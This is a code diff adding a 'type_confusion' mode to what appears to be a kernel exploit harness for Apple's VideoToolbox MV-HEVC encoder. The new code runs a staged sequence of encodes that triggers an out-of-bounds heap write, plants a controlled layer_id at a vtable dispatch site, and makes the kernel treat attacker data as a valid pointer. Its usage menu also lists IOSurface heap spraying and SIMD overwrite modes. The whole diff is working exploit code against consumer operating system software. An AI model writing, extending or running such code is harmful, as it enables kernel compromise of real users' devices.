@@ -934,6 +934,79 @@ int main(int argc, char *argv[]) {
         rlog("Safe to attempt 214 encodes (entry 642) with controlled layer_id.\n");
         rlog("The BLRAA will fire using whatever function pointer is at the call site.\n");
 
+    } else if (strcmp(mode, "type_confusion") == 0) {
+        rlog("TYPE_CONFUSION: Target value==2 dispatch via +0x5F94 (entry 642)\n");
+        rlog("Per BLRAA path analysis: layer_id at +0x5F94 controls 3-way dispatch:\n");
+        rlog("  0 or >=3: skip (safe default)\n");
+        rlog("  1: BLRAA vtable[0x188](self, 4) — real call\n");
+        rlog("  2: 5-level chain walk → type confusion processing\n");
+        rlog("Value==2 passes buffer+0x5F98 (OUR OOB DATA) as kernel-valid pointer\n");
+        rlog("to vtable methods. NO PAN issue (pointer is in kernel heap).\n");
+        rlog("Data interpreted as HEVC params but actually contains our controlled values.\n\n");
+        rlog("REQUIRES: crash_test survival past 214 encodes (Scenario B)!\n");
+        rlog("WARNING: If crash at 197, this WILL kernel panic!\n\n");
+        if (phase1_verify() != 0) goto done;
+
+        int tc_target_lid = 2;
+        int tc_encodes = (argc > 2) ? atoi(argv[2]) : 215;
+        rlog("Target: %d encodes, layer_id=%d on all entries\n", tc_encodes, tc_target_lid);
+        rlog("Entry 642 (+0x5F94) layer_id byte gets value %d → triggers chain walk\n\n",
+             tc_target_lid);
+
+        VTCompressionSessionRef tc_s = create_mvhevc_encoder(128, 128, tc_target_lid);
+        if (!tc_s) { rlog("FAILED: encoder creation\n"); goto done; }
+
+        rlog("Phase A: Safe range (190 encodes)\n");
+        for (int i = 0; i < 190; i++) {
+            int st = encode_one(tc_s, i, 128, 128);
+            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
+            if ((i+1) % 50 == 0) rlog("[%d] ok\n", i+1);
+        }
+
+        rlog("\nPhase B: Approach crash boundary (190-199)\n");
+        for (int i = 190; i < 200; i++) {
+            rlog("[%d] encoding (entries ~%d, offset +0x%x)... ",
+                 i, i*3, 0x3770 + i*3*16);
+            int st = encode_one(tc_s, i, 128, 128);
+            if (st != 0) {
+                rlog("ERROR %d — crash boundary hit\n", st);
+                rlog("*** Scenario A confirmed: entries 592+ UNREACHABLE ***\n");
+                rlog("*** Type confusion path BLOCKED ***\n");
+                goto tc_done;
+            }
+            rlog("OK\n");
+        }
+        rlog("*** Survived entry 592+ — Scenario B confirmed! ***\n\n");
+
+        rlog("Phase C: Push to BLRAA trigger (200-%d)\n", tc_encodes);
+        for (int i = 200; i < tc_encodes; i++) {
+            rlog("[%d] encoding (entries ~%d)... ", i, i*3);
+            int st = encode_one(tc_s, i, 128, 128);
+            if (st != 0) {
+                rlog("ERROR %d\n", st);
+                rlog("*** Encode %d failed — crash at entry ~%d ***\n", i, i*3);
+                break;
+            }
+            rlog("OK\n");
+            if (i == 213) {
+                rlog("*** ENCODE 214 SURVIVED — entry 642 (+0x5F94) written ***\n");
+                rlog("*** layer_id=2 placed at dispatch site ***\n");
+                rlog("*** Next encode/finalize may trigger 5-level chain walk ***\n");
+            }
+        }
+
+        rlog("\nPhase D: Finalize (triggers dispatch if entry 642 is processed)\n");
+        VTCompressionSessionCompleteFrames(tc_s, kCMTimeInvalid);
+        usleep(500000);
+        rlog("CompleteFrames returned — session finalized\n");
+        rlog("If we survived: dispatch path was either:\n");
+        rlog("  a) Not reached during finalize (needs different trigger)\n");
+        rlog("  b) Chain walk hit zero sub-branch → data processed silently\n");
+        rlog("Check crash logs for any PAC/PAN faults.\n");
+
+tc_done:
+        VTCompressionSessionInvalidate(tc_s); CFRelease(tc_s);
+
     } else if (strcmp(mode, "safe_max") == 0) {
         rlog("SAFE_MAX: Maximum safe encodes (196) with corruption check\n");
         rlog("Entry 591 (~197 enc) is the last safe entry before +0x5C70 crash\n");
@@ -1086,6 +1159,7 @@ int main(int argc, char *argv[]) {
         rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
         rlog("  table2_heap [enc] [lid] -- Table 2 OOB + IOSurface spray test\n");
         rlog("  crash_test [lid]     -- Incremental approach to +0x5C70 crash boundary\n");
+        rlog("  type_confusion [enc] -- 215 enc, layer_id=2 → value==2 dispatch path\n");
         rlog("  blraa_boundary [lid] -- 213 encodes, stop BEFORE BLRAA trigger at 642\n");
         rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
         rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
